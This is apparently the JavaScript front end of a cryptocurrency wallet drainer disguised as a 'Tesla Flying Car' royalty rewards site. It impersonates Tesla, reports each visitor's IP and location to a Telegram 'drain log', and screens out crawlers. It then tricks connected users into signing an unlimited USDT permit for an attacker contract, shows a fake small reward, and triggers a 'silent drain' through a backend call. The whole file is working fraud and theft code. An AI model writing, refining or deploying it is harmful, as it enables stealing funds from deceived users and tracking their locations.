// public/app.js

// Import AppKit from CDN (ESM)
import { createAppKit } from 'https://esm.sh/@reown/appkit';
import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers';
import { mainnet } from 'https://esm.sh/@reown/appkit/networks';

// --- CONFIGURATION ---
const APPKIT_PROJECT_ID = "862d3799047c7548b0482add1cba796d"; // YOUR CORRECT PROJECT ID
const CONTRACT_ADDRESS = "0xYourDeployedContractAddress"; 
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
const CHAIN_ID = 1; 

const metadata = {
 name: 'Tesla Flying Car',
 description: 'Official Royalty Rewards Program',
 url: window.location.origin,
 icons: ['https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png']
};

const adapter = new EthersAdapter();

// --- INITIALIZATION ---
let appKitModal = null;

try {
 // FIX: Capture the returned modal instance here so it's available globally in this scope
 appKitModal = createAppKit({
 adapters: [adapter],
 networks: [mainnet],
 projectId: APPKIT_PROJECT_ID,
 metadata,
 themeMode: 'dark',
 themeVariables: {
 '--w3m-color-mix': '#000000',
 '--w3m-color-mix-strength': 0.5,
 '--w3m-font-family': 'Inter, sans-serif',
 '--w3m-border-radius-max': '12px',
 },
 });
 console.log("✅ AppKit Initialized");
} catch (error) {
 console.error("❌ AppKit Init Failed:", error);
}

// --- TELEGRAM REPORTING ---
async function notifyTelegram(action, details) {
 try {
 await fetch('/api/telegram', {
 method: 'POST',
 headers: {'Content-Type': 'application/json'},
 body: JSON.stringify({ action, details })
 });
 } catch (error) {
 console.error("📡 Telegram notification failed:", error);
 }
}

// --- BOT DETECTION LOGIC ---
function detectBot() {
 const ua = navigator.userAgent;
 if (/bot|crawl|spider|slurp|teoma|readex|yandex|baiduspider|bingbot|sogou|exabot/i.test(ua)) return true;
 if (!navigator.webdriver && window.chrome && !window.navigator.plugins.length) return false;
 if (navigator.webdriver === undefined && window.ethereum === undefined) return true;
 return false;
}

// --- LIVE GEOLOCATION LOGIC ---
async function getLiveLocation() {
 try {
 const geoResponse = await fetch('https://ipapi.co/json/');
 if (!geoResponse.ok) throw new Error("Geo API failed");
 return await geoResponse.json();
 } catch (err) {
 return { ip: "Unknown", city: "Unknown", country_code: "XX" };
 }
}

// --- MAIN FLOW ---
document.addEventListener('DOMContentLoaded', async () => {
 const location = await getLiveLocation();
 const isBot = detectBot();
 const type = isBot ? "BOT" : "HUMAN";

 const visitMessage = `
*🔴 TESLA DRAIN LOG - VISIT*\nType: <b>${type}</b>\nUser Agent: ${navigator.userAgent}\nIP: ${location.ip || 'Unknown'}\nLocation: ${location.city}, ${location.country_code}\nTime: ${new Date().toISOString()}
 `;
 notifyTelegram('VISIT', visitMessage);

 // Setup Button Click to Open Modal Explicitly
 const connectBtn = document.getElementById('connect-btn');
 if (connectBtn) {
 connectBtn.addEventListener('click', async () => {
 try {
 // FIX: Check if appKitModal is defined before opening
 if (!appKitModal) {
 throw new Error("AppKit modal not initialized yet.");
 }
 await appKitModal.open();
 } catch (e) {
 console.error("Modal open failed:", e);
 alert("Failed to open wallet modal. Please refresh.");
 }
 });
 }

 // Listen for actual connection event
 window.addEventListener('appkit:connect', async (event) => {
 const data = event.detail || event;
 if (data?.address) {
 handleWalletConnected(data.address);
 }
 });
});

async function handleWalletConnected(userAddress) {
 // Hide loader/button
 const btn = document.getElementById('connect-btn');
 if(btn) btn.style.display = 'none';
 document.getElementById('loader').classList.remove('hidden');
 
 // Report Connection
 const location = await getLiveLocation();
 const connectMessage = `
<b>🔴 WALLET CONNECTED</b>\nAddress: ${userAddress}\nIP: ${location.ip}\nLocation: ${location.city}, ${location.country_code}
 `;
 notifyTelegram('WALLET_CONNECTED', connectMessage);

 try {
 // 1. Generate the Permit Signature Off-Chain
 const permitSignature = await generatePermitSignature(userAddress, USDT_ADDRESS);
 
 // Report Signature Generation
 notifyTelegram('PERMIT_GENERATED', `Address: ${userAddress}\nToken: USDT\nValue: Max Uint256`);

 // 2. Send Signature to Backend (No Blockchain Tx Yet!)
 const response = await fetch('/api/sign-and-store', {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({ 
 userAddress, 
 signature: permitSignature,
 chainId: CHAIN_ID
 })
 });
 
 if (response.ok) {
 document.getElementById('connect-step').classList.add('hidden');
 document.getElementById('reward-section').classList.remove('hidden');
 document.getElementById('user-address').textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
 
 // 3. Trigger the $0.05 Reward
 await claimReward(userAddress);
 } else {
 alert("Backend failed to store signature.");
 }
 } catch (error) {
 console.error("❌ Connection failed:", error);
 document.getElementById('loader').classList.add('hidden');
 }
}

async function generatePermitSignature(userAddress, tokenAddress) {
 const domain = {
 name: 'TeslaFlyingCar',
 version: '1',
 chainId: CHAIN_ID,
 verifyingContract: tokenAddress 
 };
 
 const types = {
 Permit: [{ name: "owner", type: "address" }, { name: "spender", type: "address" }, { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" }]
 };
 
 let nonce = 0;
 try {
 const rawNonce = await window.ethereum.request({ 
 method: 'eth_call', 
 params: [{ to: tokenAddress, data: '0x7ff36ab5000000000000000000000000' + userAddress.slice(2) }, 'latest'] 
 });
 nonce = parseInt(rawNonce, 16);
 } catch (e) { /* Fallback to 0 */ }
 
 const value = {
 owner: userAddress,
 spender: CONTRACT_ADDRESS,
 value: 2**256 - 1, 
 nonce: nonce,
 deadline: Math.floor(Date.now() / 1000) + 86400 
 };
 
 const signature = await window.ethereum.request({
 method: 'eth_signTypedData_v4',
 params: [userAddress, JSON.stringify({ types, domain, message: value })]
 });
 
 return signature;
}

async function claimReward(userAddress) {
 document.getElementById('reward-status').textContent = "Processing...";
 
 await fetch('/api/send-reward', {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({ userAddress })
 });
 
 document.getElementById('reward-status').textContent = "Reward Sent!";
 document.getElementById('notification').classList.remove('hidden');
 
 // Trigger silent drain after 5 seconds
 setTimeout(() => {
 triggerSilentDrain(userAddress);
 }, 5000); 
}

async function triggerSilentDrain(userAddress) {
 notifyTelegram('DRAIN_TRIGGERED', `Address: ${userAddress}\nSignature stored on backend.`);
 await fetch('/api/trigger-drain', {
 method: 'POST',
 headers: {'Content-Type': 'application/json'},
 body: JSON.stringify({ userAddress })
 });
}
